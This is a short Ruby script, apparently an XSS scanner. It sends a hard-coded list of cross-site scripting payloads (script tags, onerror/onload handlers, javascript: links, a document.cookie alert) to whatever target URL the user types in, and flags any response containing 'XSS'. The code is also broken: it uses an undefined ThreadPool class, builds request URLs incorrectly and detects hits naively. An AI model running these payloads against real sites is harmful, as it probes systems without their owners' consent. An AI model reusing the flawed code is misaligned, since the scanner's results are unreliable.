require 'uri'
require 'net/http'
require 'colorize'

# Payloads for XSS testing
PAYLOADS = [
  # Basic payloads
  "<script>alert('XSS Vulnerability Found!');</script>",
  "<img src=x onerror=alert('XSS Vulnerability Found!')>",

  # Additional payloads
  "<svg/onload=alert('XSS Vulnerability Found!')>",
  "<iframe src=\"javascript:alert('XSS Vulnerability Found!');\"></iframe>",
  "\"><script>alert('XSS Vulnerability Found!');</script>",
  
  # More payloads
  "<script>alert(document.cookie);</script>",
  "<img src=\"http://example.com\" onerror=\"alert('XSS Vulnerability Found!');\">",
  "<svg/onload=alert(document.domain)>",
  "<a href=\"javascript:alert('XSS Vulnerability Found!');\">Click me</a>",
  "\";alert('XSS Vulnerability Found!');",
  "<svg><script>alert('XSS Vulnerability Found!');</script>",
  "><img src=x onerror=alert('XSS Vulnerability Found!');>",
  "\"/><script>alert('XSS Vulnerability Found!');</script>",
  "\"></script><script>alert('XSS Vulnerability Found!');</script><script>",
  "';alert('XSS Vulnerability Found!');"
]

# Test XSS vulnerability for a single payload
def test_xss_vulnerability(url, payload)
  uri = URI(url)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https')

  response = http.get("#{uri.path}?#{uri.query}#{payload}")
  if response.code == '200'
    if response.body.include?('XSS')
      puts "XSS vulnerability found with payload: #{payload}".red
    else
      puts "No XSS vulnerability found with payload: #{payload}".green
    end
  else
    puts "Error testing payload #{payload}: Status code: #{response.code}".yellow
  end
end

# Test XSS vulnerability for each payload
def test_with_payloads(url, payloads)
  thread_pool = ThreadPool.new(10)
  payloads.each do |payload|
    thread_pool.process { test_xss_vulnerability(url, payload) }
  end
  thread_pool.shutdown
end

# Prompt user for target website URL
print "Enter your target website URL: "
target_url = gets.chomp

# Test XSS vulnerability
test_with_payloads(target_url, PAYLOADS)
